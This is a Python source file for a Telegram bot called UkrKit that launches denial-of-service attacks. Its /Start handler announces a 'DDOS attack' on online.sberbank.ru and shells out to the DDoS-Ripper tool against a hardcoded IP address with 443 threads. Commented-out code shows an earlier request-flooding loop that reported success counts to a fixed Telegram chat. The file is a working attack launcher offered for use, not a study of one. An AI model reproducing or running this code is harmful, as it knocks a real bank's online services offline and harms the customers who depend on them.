from telegram.ext import Updater, MessageHandler, Filters, CallbackQueryHandler,  CommandHandler
import os, requests, time, threading

class Thread:
    def __init__(self, func = None, arg =None):
        self.t = threading.Thread(target=func, args=arg)
        self.t.start()

class UkrKit(object):
    _instance = None

    def __new__(cls):
        if not hasattr(cls, '_inst'):
            UkrKit._instance = super(UkrKit, cls).__new__(cls)
            return UkrKit._instance

    def __init__(self):
        self.updater = Updater(os.getenv("TOKEN"), use_context=True)
        self.SvynogoriaServices = ["https://online.sberbank.ru/"]
        self.CountSvynogoriaServices = 0
        self.dispatcher = self.updater.dispatcher
        self.chat_id = 0
        self.CreateHandler()
        self.run()

    def CreateHandler(self):
        self.dispatcher.add_handler(CommandHandler("Start", UkrKit.Start))

    def run(self):
        self.updater.start_polling(timeout=1990000, poll_interval=1)
        self.updater.idle()


    @classmethod
    def Start(self, update, context):
        kit = UkrKit._instance
        kit.chat_id = update.message.chat_id
        context.bot.send_message(update.message.chat_id, "Start DDOS attack {0}"
                                 .format(kit.SvynogoriaServices[kit.CountSvynogoriaServices]))
        kit.AttackSvynogoria()

    def AttackSvynogoria(self):
        #num = 0
        #last_num = 50
        #fail_num = 0

        #while True:
        os.system("python DDoS-Ripper/DRipper.py -s 194.54.14.131 -p 80 -t 443 -q 10000")

        #while True:
        #    try:
                #req = Thread(requests.get, (self.SvynogoriaServices[0]))
        #        r=requests.get(self.SvynogoriaServices[0])
        #        print(r)
        #        num += 1
         #       print(num)
        #        print(fail_num)
        #        if last_num + 50 < num:
         #           last_num = num
         #           if self.chat_id != 0:
         #               self.dispatcher.bot.send_message("397362619", "DDOS was succses by {0} requests".format(num))
         #   except: fail_num+=1
UkrKit()